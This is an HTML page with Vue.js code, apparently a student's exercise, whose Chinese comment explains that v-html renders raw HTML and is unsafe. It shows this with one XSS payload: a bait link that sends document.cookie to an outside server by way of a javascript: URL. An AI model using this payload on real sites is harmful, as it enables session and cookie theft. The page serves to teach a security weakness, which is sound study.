<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../vue/vue.js"></script>
</head>
<body>
    <!-- 
        本次总结：
                
               v-html: 和v-text一样都是给标签里面添加文本内容，不过这个是添加超文本内容
               里面可以解析dom结构，安全性不好，因为就像str2 写的那样，他的意思就是把你的document.cookie(也就是你的所有cookie值)拿到然后跳转到我的服务器把这些传给我，这样就可以做坏事了

                    
     -->
    <div class="ming">
          <div>你好，{{name}}</div>
          <div v-text="str"></div>
          <div v-html="str"></div>
          <div v-html="str2"></div>

    </div>
     <script>
         Vue.config.productionTip = false
         
        const vm = new Vue({
            el:'.ming',
            data:{
              name:'李明',
              str:'<h1>明姐我还是想你</h1>',
              str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟有好东西哟</a>'
            },
            
            
          })
     </script>
    
</body>
</html>
